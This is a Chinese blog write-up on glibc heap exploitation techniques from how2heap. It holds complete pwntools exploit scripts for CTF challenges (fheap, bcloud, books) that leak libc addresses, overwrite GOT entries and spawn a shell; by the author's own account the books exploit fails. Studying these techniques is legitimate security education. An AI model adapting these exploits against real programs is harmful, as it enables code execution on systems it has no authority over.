delete(id):\n    target.recvuntil('quit')\n    target.sendline('delete ')\n    target.recvuntil('id:')\n    target.sendline(str(id))\n    target.recvuntil('sure?:')\n    target.sendline('yes')\n\ncreate(4, 'aaa\\n')\ncreate(4, 'aaa\\n')\ndelete(0)\ndelete(1)\ndelete(0)\ncreate(4, '\\x00')\ncreate(0x20, 'a' * 0x16 + 'lo' + '\\x2d\\x00')\ndelete(0)\n\ntarget.recvuntil('lo')\naddr = target.recvline()\naddr = addr[:-1]\naddr = u64(addr + '\\x00' * (8 - len(addr))) - 0xd2d\n\ndelete(1)\n\ncreate(4, '\\x00')\n\ntarget.recvuntil('quit')\ntarget.sendline('create ')\ntarget.recvuntil('size:')\ntarget.sendline(str(0x20))\ntarget.recvuntil('str:')\ntarget.send('a' * 0x18 + p64(0x00000000000011DC + addr))\n\nprint hex(addr)\n\ntarget.recvuntil('quit')\ntarget.sendline('delete ')\ntarget.recvuntil('id:')\ntarget.sendline('1')\ntarget.recvuntil('sure?:')\n\nropchain = p64(addr + 0x00000000000011e3)   # pop rdi\nropchain += p64(addr + 0x202070)            # got@malloc\nropchain += p64(addr + 0x0000000000000990)  # plt@put\n\nropchain += p64(addr + 0x00000000000011e3)  # pop rdi\nropchain += p64(1)\nropchain += p64(addr + 0x00000000000011DA)  # magic\nropchain += p64(0)                          # rbx\nropchain += p64(1)                          # rbp\nropchain += p64(addr + 0x0000000000202058)  # r12 -> rip got@read\nropchain += p64(8)                          # r13 -> rdx\nropchain += p64(addr + 0x0000000000202078)  # r14 -> rsi got@atoi\nropchain += p64(0)                          # r15 -> rdi\nropchain += p64(addr + 0x00000000000011C0)  # magic\nropchain += 'a'*8*7\n\nropchain += p64(addr + 0x0000000000000B65)  # getInt\n\ntarget.sendline('yes     ' + ropchain)\naddr = target.recvline()[:-1]\naddr = u64(addr + '\\x00' * (8 - len(addr)))\n#addr = addr - 534112 + 288144\naddr = addr - 537984 + 283536\nprint hex(addr)\ntarget.sendline(p64(addr)+'/bin/sh')\ntarget.interactive()\n```\n\n另外一种方法，更简单，[参考链接](https://cartermgj.github.io/2016/12/01/Hctf-jiushigan/)\n\n```\nfrom pwn import *\n\ncontext.log_level = 'debug'\nglobal io\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\nelf = ELF('./pwn-f')\n\ndef create_list(io,length,strr):\n\tio.recvuntil('quit')\n\tio.sendline('create ')\n\tio.recvuntil('Pls give string size:')\n\tio.sendline(length)\n\tio.recvuntil('str:')\n\tio.sendline(strr)\n\ndef delete_list(io,number):\n\tio.recvuntil('quit')\n\tio.sendline('delete ')\n\tio.recvuntil('id:')\n\tio.sendline(number)\n\tio.recvuntil('Are you sure?:')\n\tio.sendline('yes')\n\n\ndef pwn():\n\tglobal io\n\n\tdebug = 1\n\tif debug:\n   \t \tio = process('./pwn-f')\n\telse:\n\t\t#io = remote('127.0.0.1',2333)\n\t\tio = remote('115.28.78.54',80)\n\t\tio.recvuntil('please input you token: ')\n\t\tio.sendline('b66888c818c08d932ea91b8d6a1f122c2y7ZAdbh')\n#------------------------------------------------use fsb to leak __libc_start_main's address\n\tcreate_list(io,'10','aaaa')\n\tcreate_list(io,'10','bbbb')\n\tcreate_list(io,'10','cccc')\n\tdelete_list(io,'0')\n\tdelete_list(io,'1')\n\tdelete_list(io,'2')\n\tcontent1 = \"%175$p\".ljust(24,'a')+'\\xd0\\xf9\\x00'\n\tcreate_list(io,'29',content1)\n\tdelete_list(io,'1')                     #-----printf('%113$p')\n\n\tdata = io.recv(14)\n\tlibc_start_main = int(data,16)-240\n\tprint \"libc_start_main_addr=\"+hex(libc_start_main)\n#--------------------------------------------------caculate system_addr\t\n\tlibc_start_main_offset = libc.symbols['__libc_start_main']\n\tsystem_addr = libc.symbols['system']\n\tsystem_addr = libc_start_main  - libc_start_main_offset + system_addr\n\tprint \"system_addr=\" + hex(system_addr)\n\n\tcreate_list(io,'10','zzzz\\x00')\n\n\tcreate_list(io,'10','aaaa\\x00')\n\tcreate_list(io,'10','bbbb\\x00')\n\tcreate_list(io,'10','cccc\\x00')\n\tdelete_list(io,'2')\n\tdelete_list(io,'3')\n\tdelete_list(io,'4')\n#----------can't have '\\x00' in string.because len(string) must >15.And after '/bin/sh' must have a space.\n\tcontent2 = \"/bin/sh #\".ljust(24,'a')+ p64(system_addr)  \n\tcreate_list(io,'32',content2)\n\tdelete_list(io,'3')                     #system('/bin/sh')\n\t\n\tio.sendline('uname -a')\n\tio.interactive()\n\n\n\nif __name__ == '__main__':\n\twhile True:\n\t\ttry:\n\t\t\tpwn()\n\t\texcept EOFError:\n\t\t\tprint 'guess not success!!!'\n\t\t\tio.close()\n\t\t\ttime.sleep(0.5)\n```\n\n## 0x04 unsafe unlink\n\n这里的unlink分为两种，一个释放堆块的相邻堆块共有两个，当**前一个堆块**空闲时，**向后合并**；当**后一个堆块**空闲时，**向前合并**。\n\nglibc的unlink宏（简化版）：\n```\nFD = P->fd;\nBK = P->bk;\nif(FD->bk == P && BK->fd == P)\n{\n\tFD->bk = P;\n\tBK->fd = P;\n}\n```\n\n当我们存在向后合并的情况时：\n```\n/*\n| chunk1(p1) | chunk2(p2) |\n*/\n#include <stdio.h>\n\nvoid *ptr;\n\nint main()\n{\n\tint prev_size, size, fd, bk;\n\tvoid *p1, *p2;\n\tchar buf[253] = \"\";\n\n\tp1 = malloc(252);\n\tp2 = malloc(252);\n\n\tptr = p1;\n\tprev_size = 0;\n\tsize = 249;\n\tfd = (int)(&ptr) - 0xc;\n\tbk = (int)(&ptr) - 0x8;\n\n\tmemset(buf, 'c', 253);\n\tmemcpy(buf, &prev_size, 4);\n\tmemcpy(buf+4, &size, 4);\n\tmemcpy(buf+8, &fd, 4);\n\tmemcpy(buf+12, &bk, 4);\n\tsize = 248;\n\tmemcpy(&buf[248], &size, 4);\n\tbuf[252] = '\\x00';\n\n\tmemcpy(p1, buf, 253);\n\tfree(p2);\n\treturn 0;\n}\n```\n此时我们free掉p2的话，由于我们伪造了chunk2的pre_presize和pre_inuse位，会使得向后合并的情况发生，fake_chunk会向后融合。再来观察unlink宏\n```\n/*P为fake_chunk，由chunk2->pre_size得到\nP == ptr;\n*/\nFD = P->fd;                     // FD = P->fd = &ptr - 0xc = *(ptr + 0x8)\nBK = P->bk;                    // BK = P->bk = &ptr - 0x8 = *(ptr + 0xc)\nif(FD->bk == P && BK->fd == P)\n/*\n\t此时\n    FD->bk = ptr = *(&ptr - 0xc + 0xc)\n    BK->fd = ptr = *(&ptr - 0x8 + 0x8)\n    绕过检查\n*/\n{\n\tFD->bk = BK;                // FD->bk = &ptr - 0x8; ptr == &ptr - 0x8;\n\tBK->fd = FD;                 // BK->fd = &ptr - 0xc; ptr == &ptr - 0xc;\n}\n/*\n最后ptr = &ptr - 0xc\n*/\n```\n\n## 0x05 house of spirit\n\n## 0x09 house of force\n\n我们知道os中存在一个top chunk用来在分配堆块，当我们的bins中不存在合适的堆块时，从top chunk中来切割出合适大小的堆块已分配给用户。\n\n这里我们来看`how2heap`中给出的demo\n\n首先我们定义一个全局变量`bss_var`，值为`This is a string that we want to overwrite.`\n\n我们查看下他的地址为`0x602060`\n```\npwndbg> p &bss_var \n$3 = (char (*)[44]) 0x602060 <bss_var>\n```\n\n然后我们分配一个大小256堆块，地址为`0x7fffffffdec8`\n```\npwndbg> p &p1\n$4 = (intptr_t **) 0x7fffffffdec8\n```\n由于已使用中的chunk要加上8byte的`prev_size`和8byte的`size`\n\n所以真实的chunk的起始地址为`0x603410`\n此时我们查看堆的地址如下\n```\npwndbg> heap \nTop Chunk: 0x603520\nLast Remainder: 0\n\n0x603000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0x20706f7420656854, \n  bk = 0x7473206b6e756863, \n  fd_nextsize = 0x2074612073747261, \n  bk_nextsize = 0x3832353330367830\n}\n0x603410 PREV_INUSE {\n  prev_size = 0, \n  size = 273, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0x603520 PREV_INUSE {\n  prev_size = 0, \n  size = 133857, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n```\n此时原先的top chunk的大小为`133857-1`(1为flag位)\n\n我们修改top chunk的size为`-1`(`0xffffffffffffffff`)\n此时，top chunk的大小为\n```\n0x603520 {\n  prev_size = 0, \n  size = 0, \n  fd = 0xffffffffffffffff, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n```\n然后我们分配一个正好在我们欲修改位置毗邻的大小的堆块，这样我们在再下一次malloc时我们就可以分配到想要的位置了\n\n我们分配的大小为`unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*3 - (unsigned long)ptr_top;`\n也就是`0xffffffffffffeb28`，得到这样一个大数以实现堆的反向分配\n\n此时我们再分配就得到了`bbs_var`了，我们可以对`bbs_var`做读写操作了\n\n#### 例题\n\n2017zctf的dragon和2016bctf的bclould\n\n先看2016bctf这题\n在输入姓名时存在有漏洞的截断，当我们输入`i`个字符时，是在第`i+1`的位置添加`\\x00`然而，但是我们后面看到的地址的赋值操作时，会把`\\x00`给覆盖掉，当我们`strcpy`时，就会把堆指针给copy进去。\n\n```\nint sub_80487A1()\n{\n  char buffer; // [sp+1Ch] [bp-5Ch]@1\n  char *_name; // [sp+5Ch] [bp-1Ch]@1\n  int v5; // [sp+6Ch] [bp-Ch]@1\n\n  v5 = *MK_FP(__GS__, 20);\n  memset(&buffer, 0, 80u);\n  puts(\"Input your name:\");\n  read_buf((int)&buffer, 64, 10);\n  _name = (char *)malloc(64u);\n  name_addr = (int)_name;                                     //这里存在将'\\x00'覆盖的情况\n  strcpy(_name, &buffer);\n  sub_8048779((int)_name);\n  return *MK_FP(__GS__, 20) ^ v5;\n}\n```\n\n```\npwndbg> telescope 0x915d008 20\n00:0000│ eax  0x915d008 ◂— 0x61616161 ('aaaa')\n... ↓\n0f:003c│      0x915d044 ◂— 0x62616161 ('aaab')\n10:0040│      0x915d048 —▸ 0x915d008 ◂— 0x61616161 ('aaaa')\n11:0044│ edx  0x915d04c ◂— 0x20f00\n12:0048│      0x915d050 ◂— 0x0\n```\n这里我们能看到输出的是`name_addr`这个指针的值。\n\n接下来的`org`和`host`的copy其实也存在这个漏洞。\n```\nint sub_804884E()\n{\n  char org; // [sp+1Ch] [bp-9Ch]@1\n  char *_org; // [sp+5Ch] [bp-5Ch]@1\n  int host; // [sp+60h] [bp-58h]@1\n  char *_host; // [sp+A4h] [bp-14h]@1\n  int v5; // [sp+ACh] [bp-Ch]@1\n\n  v5 = *MK_FP(__GS__, 20);\n  memset(&org, 0, 0x90u);\n  puts(\"Org:\");\n  read_buf((int)&org, 64, 10);\n  puts(\"Host:\");\n  read_buf((int)&host, 64, 10);\n  _host = (char *)malloc(64u);\n  _org = (char *)malloc(64u);\n  org_addr = (int)_org;\n  host_addr = (int)_host;\n  strcpy(_host, (const char *)&host);\n  strcpy(_org, &org);\n  puts(\"OKay! Enjoy:)\");\n  return *MK_FP(__GS__, 20) ^ v5;\n}\n```\n好吧，其实这里还是细心才能看到的漏洞，我们发现`strcpy(_org, &org);`这里其实是会把`org+_org+host`的数据全部copy到堆上，实事上我们可以调试发现，`host`的数据正好覆盖了top chunk的size，也就是`wildness`，这里我们修改为`0xffffffff`\n\n覆盖前：\n```\n0x945a098:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n0x945a0a8:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n0x945a0b8:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n0x945a0c8:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n0x945a0d8:\t0x00000000\t0x00020e71\t0x00000000\t0x00000000\n0x945a0e8:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n```\n覆盖后：\n```\npwndbg> x/40wx 0x945a098\n0x945a098:\t0x61616161\t0x61616161\t0x61616161\t0x61616161\n0x945a0a8:\t0x61616161\t0x61616161\t0x61616161\t0x61616161\n0x945a0b8:\t0x61616161\t0x61616161\t0x61616161\t0x61616161\n0x945a0c8:\t0x61616161\t0x61616161\t0x61616161\t0x61616161\n0x945a0d8:\t0x0945a098\t0xffffffff\t0x00000000\t0x00000000\n0x945a0e8:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n```\n我们发现`0x945a0d8`这行的值被修改为我们想要的`0xffffffff`了。\n\n这题能够通过`house of force`来解决。\n\n我实现的步骤：\n1. leak name_addr 的堆地址，并通过计算得到top chunk的地址\n2. 修改wildness为`0xffffffff(-1)`\n3. 分配一个大小为`wanted_addr - top_chunk_addr`堆块， 此时再分配得到的堆块即在`wanted_addr`地址上，我们就可以操纵这里的数据了\n4. 修改此处的堆块数据，覆盖`content_addr[]`为`free_got, read_got, atoi_got`\n5. `edit()`id0的结构，修改`free_got`为`printf`\n6. `delete()`id1，泄露`read`的地址\n7. `edit()`id2， 修改`atoi`为`system`\n8. getshell\n\n```\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\ncontext(log_level = 'critical')\n\np = process('./bcloud')\nelf = ELF('./bcloud')\nlibc = ELF('/lib32/libc.so.6')\n\natoi_got = elf.got['atoi']\nread_got = elf.got['read']\nfree_got = elf.got['free']\nprintf_plt = elf.plt['printf']\n\nbss = 0x0804B060\ncontent_length = 0x0804b0a0\ncontent_addr = 0x804B120\n\ndef new(length, content):\n    p.recvuntil('>>\\n')\n    p.sendline('1')\n    p.recvuntil('content:\\n')\n    p.sendline(str(length))\n    p.recvuntil('content:\\n')\n    p.sendline(content)\n\ndef edit(index, content):\n    p.recvuntil('>>\\n')\n    p.sendline('3')\n    p.recvuntil('id:\\n')\n    p.sendline(str(index))\n    p.recvuntil('content:\\n')\n    p.sendline(content)\n    p.recvuntil('success.\\n')\n\ndef leak_overwrite_wildness():\n    p.recvuntil('name:\\n')\n#   raw_input()\n    p.send('a' * (0x40 - 1) + 'b')\n    p.recvuntil('b')\n    addr = p.recv(4)\n    p.recvline()\n    p.recvuntil('Org:\\n')\n    p.send('a' * 0x40)\n    p.recvuntil('Host:\\n')\n    p.sendline('\\xff\\xff\\xff\\xff')\n    return u32(addr)\n\ndef main():\n#   leak name_heap_addr \n    name_heap_addr = leak_overwrite_wildness()\n    print 'name_heap => ', hex(name_heap_addr - 0x08)\n    base_heap = name_heap_addr + 0xd0\n    print 'base_heap => ', hex(base_heap)\n\n#   malloc a gabage chunk to bss\n    offset = bss - base_heap + 0x30\n    print 'offset => ', offset\n    new(offset, 'abcdabcd') # id0\n\n#   malloc a chunk on bss of free and overwrite content_length[] & content_addr[]\n    payload = ''\n    payload += p32(4)\n    payload += p32(4)\n    payload += p32(4)\n    payload += (content_addr - content_length - len(payload)) * '\\x00'\n    payload += p32(free_got)  # id0\n    payload += p32(read_got)  # id1\n    payload += p32(atoi_got)  # id2\n    new('168', payload)\n\n#   overwrite free_got with printf_plt\n    edit(0, p32(printf_plt))\n\n#   '4.Delete' to printf libc to get system_addr\n    p.recvuntil('>>\\n')\n    p.sendline('4')\n    p.recvuntil('id:\\n')\n    p.sendline(str(1))\n    read_addr = u32(p.recv(4))\n    print 'read_addr => ', read_addr\n\n#   modify atoi to system\n    libc.address = read_addr - libc.symbols['read']\n    system_addr = libc.symbols['system']\n    payload2 = p32(system_addr)\n    edit(2, payload2)\n\n#   getshell\n    p.recvuntil('>>\\n')\n    p.sendline('/bin/sh\\n')\n    p.interactive()\n\nif __name__ == '__main__':\n    main()\n```\n\n## 0x09 overlapping chunks\n\n除了how2heap上演示的extend freed chunks，参考了这篇[文章](http://blog.dazzlepppp.cn/2016/10/15/Producing-Overlapping-Chunks/)后面的内容。\n\n堆块重叠指两块不同的堆块存在重叠部分，以至于我们写任意一块时也会覆写到另一块堆块中。\nhow2heap给出的演示程序中的意思是，当我们修改了一个已经被free了的chunk的size时，我们再次分配就可以得到一个修改后size的堆块，然后就可以构成堆块重叠，修改当前堆块将会修改到后一个堆块。\n\n查阅资料的过程中发现还可以在free之前修改size的大小，但是实际测试会发现在free的时候会崩溃，暂时没有找到原因。\n\n以how2heap例题2015hack.lu的books为例。\n\n存在明显的堆溢出，程序逻辑如下\n```\nsigned __int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  signed __int64 result; // rax@4\n  __int64 v4; // rcx@16\n  signed int v5; // [sp+4h] [bp-BCh]@5\n  void *final_str; // [sp+8h] [bp-B8h]@0\n  void *order1; // [sp+18h] [bp-A8h]@1\n  void *order2; // [sp+20h] [bp-A0h]@1\n  char *dest; // [sp+28h] [bp-98h]@1\n  char s; // [sp+30h] [bp-90h]@6\n  __int64 v11; // [sp+B8h] [bp-8h]@1\n\n  v11 = *MK_FP(__FS__, 40LL);\n  order1 = malloc(0x80uLL);\n  order2 = malloc(0x80uLL);\n  dest = (char *)malloc(0x80uLL);\n  if ( order1 && order2 && dest )\n  {\n    v5 = 0;\n    puts(\" Crappiest and most expensive books for your college education!\\n\\nWe can order books for you in case they're not in stock.\\nMax. two orders allowed!\\n\");\n    while (\n    {\n      if ( v5 )\n      {\n        printf(\"%s\", final_str);\n        printf(dest);                           // fsb\n        result = 0LL;\n        goto finish;\n      }\n      puts(\"1: Edit order 1\");\n      puts(\"2: Edit order 2\");\n      puts(\"3: Delete order 1\");\n      puts(\"4: Delete order 2\");\n      puts(\"5: Submit\");\n      fgets(&s, 128, stdin);\n      switch ( s )\n      {\n        case '1':\n          puts(\"Enter first order:\");\n          edit((__int64)order1);\n          strcpy(dest, \"Your order is submitted!\\n\");\n          continue;\n        case '2':\n          puts(\"Enter second order:\");\n          edit((__int64)order2);\n          strcpy(dest, \"Your order is submitted!\\n\");\n          continue;\n        case '3':\n          delete(order1);\n          continue;\n        case '4':\n          delete(order2);\n          continue;\n        case '5':\n          final_str = malloc(0x140uLL);\n          if ( !final_str )\n          {\n            fwrite(\"Something failed!\\n\", 1uLL, 0x12uLL, stderr);\n            result = 1LL;\n            goto finish;\n          }\n          submit((__int64)final_str, (const char *)order1, (char *)order2);\n          v5 = 1;\n          break;\n        default:\n          continue;\n      }\n    }\n  }\n  fwrite(\"Something failed!\\n\", 1uLL, 0x12uLL, stderr);\n  result = 1LL;\nfinish:\n  v4 = *MK_FP(__FS__, 40LL) ^ v11;\n  return result;\n}\n```\n\n我们发现在`submit`函数这里存在溢出，我们通过修改已经free的chunk2的size为0x151这样在我们malloc是就会得到这款内存，进而在`submit`函数中溢出`dest`，利用格式化字符串。\n\n但是还有一个问题，我们在格式化字符串之后没有再call任何函数，所以我们通过修改`.fini`section为`main`的地址，以再结束后再次运行到`main`，关于`.fini`的作用在[这篇](http://l4u-00.jinr.ru/usoft/WWW/www_debian.org/Documentation/elf/node3.html)中提到了\n\n> .fini\nThis section holds executable instructions that contribute to the process termination code. That is, when a program exits normally, the system arranges to execute the code in this section.\n.init\nThis section holds executable instructions that contribute to the process initialization code. That is, when a program starts to run the system arranges to execute the code in this section before the main program entry point (called main in C programs).\n\n总结来说，.fini是程序结束时的全局析构函数的地址，我们可以通过修改这个来得到控制流。\n\n在程序刚开始的时候就malloc了三个连续的chunk，我们可以随意溢出，但是后面接着的`strcpy`会截断我们的溢出，以至于格式化字符串不能利用，于是我们只能利用`submit`这个还能输里面的`strcat`来溢出`dest`里的字符串来得到格式化字符串。\n\n所以思路如下：\n1. free掉chunk2\n2. 溢出chunk1将chunk2修改为0x151，这样我们在submit的时候就会分配到这个位置\n3. submit溢出dest，利用格式化字符串修改free的低2位（其中1位需要猜，1/16概率），同时修改`.fini`为程序开始\n4. 传入/bin/sh，得到shell\n\n由于我们只能控制eip两次，所以不能有泄露的步骤了，下面的exp是有泄露的步骤的，没有成功\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1 \nlocal = 1\ndebug = 0\n\nglobal p\ncontext(arch='amd64')\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./books')\n    libc =  ELF('/lib/x86_64-linux-gnu/libc.so.6')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nelf = ELF('./books')\nfree_got = elf.got['free']\n\ndef edit1(payload):\n    p.recvuntil('Submit\\n')\n    p.sendline('1')\n    p.recvuntil('order:\\n')\n    p.sendline(payload)\n\ndef edit2(payload):\n    p.recvuntil('Submit\\n')\n    p.sendline('2')\n    p.recvuntil('order:\\n')\n    p.sendline(payload)\n\ndef dele(index):\n    p.recvuntil('Submit\\n')\n    p.sendline(str(index + 2))\n\ndef submit():\n    p.recvuntil('Submit\\n')\n    p.sendline('5')\n\ndef pwn():\n    dele(2)\n    payload = '%1908x' + '%13$hn' # 400a39\n    payload += '%31$lx'\n    payload = payload.ljust(0x80)\n    payload += p64(0) + p64(0x151)\n    edit1(payload)\n    p.recvuntil('Submit\\n')\n    payload = '5'.ljust(8, '\\x00') + p64(0x6011f0)\n#    payload += '%{}x'.format(39 - len(payload)) + '%13$hhn'\n    gdb.attach(p)\n    p.sendline(payload)\n    print p.recvline()\n    print p.recvline()\n    print p.recvline()\n    print p.recvuntil('400fda')\n    leak_addr = int(p.recv(12), 16)\n    print 'leak_addr => ', hex(leak_addr)\n    libc.address = leak_addr - 241 - libc.symbols['__libc_start_main']\n    print 'libc.address => ', hex(libc.address)\n    system_addr = libc.symbols['system']\n    print 'system_addr => ', hex(system_addr)\n\n    dele(2)\n    low_bytes = int(hex(system_addr)[-4:], 16)\n    mid_bytes = int(hex(system_addr)[8:10], 16)\n    payload = '%{}x'.format(int(hex(system_addr)[8:10], 16) - 12) + '%13$hhn'\n    payload += '%{}x'.format(low_bytes - mid_bytes) + '%14$hn'\n    payload = payload.ljust(0x80)\n    payload += p64(0) + p64(0x151)\n#    gdb.attach(p)\n    edit1(payload)\n    p.recvuntil('Submit\\n')\n    payload = '5'.ljust(8, '\\x00') + p64(free_got+2)\n    payload += p64(free_got)\n    p.sendline(payload)\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n\n## 0x0A unsorted bin attack\n\n这个应该是最简单的堆溢出技术了吧，先看当我们释放`unsortbin`时的源码\n\n```\nbck = victim->bk;\n.........\n/* remove from unsorted list */\nunsorted_chunks (av)->bk = bck;\nbck->fd = unsorted_chunks (av);\n```\n并没有使用`unlink`宏，所以这里不存在检查指针的情况，如果我们修改了`victim->bk`的值为`fake_addr`，那么`(av)->bk`也会被修改，同时`fake_addr+16 = victim->bk->fd = (av)`，我们就将一个大的数字写到了`fack_addr+16`的位置去。但是由于`(av)->bk`被破坏了，所以下次再走到这步时可能会出错，具体什么操作出现什么问题还待研究。\n\n这个看似任意地址写但是不能控制写的内容，所以只能作为其他攻击的准备。how2heap给出的方法时修改`global_max_fast`，这样我们在剩下分配其他内存时都会以`fastbin`的方式分配，为`fastbin`攻击做准备。\n\n### 例题\n\n这里用给出的20160ctf的ZeroStorage为例\nOrz我去这程序怎么这么长。。。","source":"_posts/how2heap.md","raw":"---\ntitle: how2heap\ntags:\n  - PWN\n  - heap\ncategories: []\ndate: 2017-03-28 17:45:10\n---\n\n## 0x00\n\n堆溢出搞了很久，道理我都懂，但是就是在实战中用不起来，只能花功夫一定要在这周把堆溢出啃下来。\n以[how2heap](https://github.com/shellphish/how2heap)为学习路径，step by step，记录下，可能的话，帮助到后来的人。\n\n> | File | Technique | Applicable CTF Challenges |\n|------|-----------|---------------------------|\n| [first_fit.c](first_fit.c) | 演示glibc malloc的首次适应(first-fit)行为 | |\n| [fastbin_dup.c](fastbin_dup.c) | 通过操作fastbin已释放的表，来除法malloc以返回已经分配过的堆指针| |\n| [fastbin_dup_into_stack.c](fastbin_dup_into_stack.c) | 通过操作fastbin的已释放的表，来触发malloc来得到一个几乎任意指向的指针 | [9447-search-engine](https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine) |\n| [unsafe_unlink.c](unsafe_unlink.c) | Exploiting free on a corrupted chunk to get arbitrary write. | [HITCON CTF 2014-stkof](http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/) |\n| [house_of_spirit.c](house_of_spirit.c) | Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer. | [hack.lu CTF 2014-OREO](https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo) |\n| [poison_null_byte.c](poison_null_byte.c) | Exploiting a single null byte overflow. | [PlaidCTF 2015-plaiddb](https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb) |\n| [house_of_lore.c](house_of_lore.c) | Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist. | |\n| [overlapping_chunks.c](overlapping_chunks.c) | 利用覆写已释放在unsortbin链中chunk的size位，去获得一个重叠在已分配chunk的新的分配 | [hack.lu CTF 2015-bookstore](https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore) |\n| [house_of_force.c](house_of_force.c) | 溢出Top chunk头去分配，来得到一个接近任意地址的指针 | [Boston Key Party 2016-cookbook](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6), [BCTF 2016-bcloud](https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200) |\n| [unsorted_bin_attack.c](unsorted_bin_attack.c) | 利用在unsortbin的freelist链表里的一个已释放chunk的overwrite去在任意地址中写入一个大数 | [0ctf 2016-zerostorage](https://github.com/ctfs/write-ups-2016/tree/master/0ctf-2016/exploit/zerostorage-6) |\n| [house_of_einherjar.c](house_of_einherjar.c) | Exploiting a single null byte overflow to trick malloc into returning a controlled pointer  | [Seccon 2016-tinypad](https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf) |\n\n<!--more-->\n## 0x01 first fit\n\n这里主要提供了一个UAF的使用示例。glibc使用的first-fit算法来选择空间分配，当我们之前释放的chunk足够大时，程序就会最先使用这个chunk。但此时释放的上一个使用此chunk的指针依然指向这个chunk，我们可以通过一个已经free过的指针来控制这个chunk。\n\n## 0x02 fastbin dup\n\nfastbin通过一个链表来维护空闲的chunk，当一个chunk被free掉之后，会将这个chunk接回链表的头部，下次申请时会申请这个chunk。\n\n## 0x03 fastbin dup into stack(double-free)\n\n这个就是double-free的一个利用。\n当我们`malloc`一个小于`128`的堆块的时候，`ptmalloc`就会调用到`fastbin`。`fastbin`是由一个单链表组成的，遵循`FIFO`原则，由于`fastbin`在`free`的时候并不会对指针是否已经释放做检查，所以我们可以构造出一个循环链表的情况。\n比如：\n\n```\nint *a = malloc(8) ;\nint *b = malloc(8);\nfree(a);\nfree(b);\n```\n此时维护的一个链表结构为\n`[head] -> b -> a -> null`\n\n当我们再次\n\n`free(a);`\n\n此时的链表结构为\n\n`[head] -> a -> b -> a -> null`\n\n紧接着我们申请两次堆\n\n```\n*a = malloc(8);\n*b = malloc(8);\n```\n\n此时我们维护的链表结构为\n\n`[head] -> a -> null`\n\n如果我们修改`a`的前八个字节为我们的希望的地址，当我们两次`malloc`之后，我们就能得到一个指向任意地址的指针。\n\n```\n*a = &attribute_addr;\nint *c = malloc(8);   //c == a\nint *d = malloc(8);   // d == attribute_addr\n```\n\n维护的链表如下\n\n```\n[head] -> a -> null\n[head] -> a -> attribute\n[head] -> attribute\n```\n\n于是我们就可以得到一个`8bit`的任意地址写了。\n\n以下用_2016hctf_的`就是干`为例\n\n#### 例题\n\n首先分析程序，先查看程序的保护\n\n```\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2016hctf/pwn/fheap$ checksec pwn-f \n[*] '/home/ubuntu/ctf-problem/2016hctf/pwn/fheap/pwn-f'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n由于程序打开的PIE，我们在gdb调试的时候很不方便，gdb默认是关闭`aslr`的，但是它会给程序加上一个默认的基地址`0x555555554000`\n\n这个程序有两个功能：\n\n1. 添加字符串\n2. 删除一个字符串\n\n其中，存储字符串的结构题如下：\n\n```\n00000000 info            struc ; (sizeof=0x20, mappedto_1)\n00000000 content         db 16 dup(?)            ; string(C)\n00000010 size            dq ?\n00000018 DestroyFunc      dq ?                    ; 这里是程序的调用的free函数的地址\n00000020 info            ends\n\nstruct info{\n\tchar cintent[16];\n    int size;\n    void* DestroyFunc;\n};\n```\n\n当我们申请小于15字节的长度时，字符串会直接保存在`info.content`中。当我们申请长度大于15的字符串的时候，程序会另外申请一个字符串大小的堆，同时这个堆的地址保存在原本的`info.content`中\n\n```\n    if ( nbytesa > 15 )\n    {\n      dest = (char *)malloc(nbytesa);\n      if ( !dest )\n      {\n        puts(\"malloc faild!\");\n        exit(1);\n      }\n      strncpy(dest, &buf, nbytesa);\n      *(_QWORD *)ptr = dest;\n      *((_QWORD *)ptr + 3) = sub_D6C;           // free(*content)\n                                                // free(content)\n    }\n    else\n    {\n      strncpy(ptr, &buf, nbytesa);\n      *((_QWORD *)ptr + 3) = sub_D52;           // free(content)\n    }\n```\n\n小于15时堆内存分布\n```\npwndbg> x/6xg 0x555555757000\n0x555555757000:\t0x0000000000000000\t0x0000000000000031\n0x555555757010:\t0x0000000061616161\t0x0000000000000000           // content\n0x555555757020:\t0x0000000000000004\t0x0000555555554d52           // size + DestroyFunc\n```\n\n大于15时堆内存的分布情况\n```\npwndbg> x/6xg 0x555555757060\n0x555555757060:\t0x0000000000000000\t0x0000000000000021\n0x555555757070:\t0x6161616161616161\t0x6262626262626161           // content\n0x555555757080:\t0x000000000a626262\t0x0000000000020f81\npwndbg> x/6xg 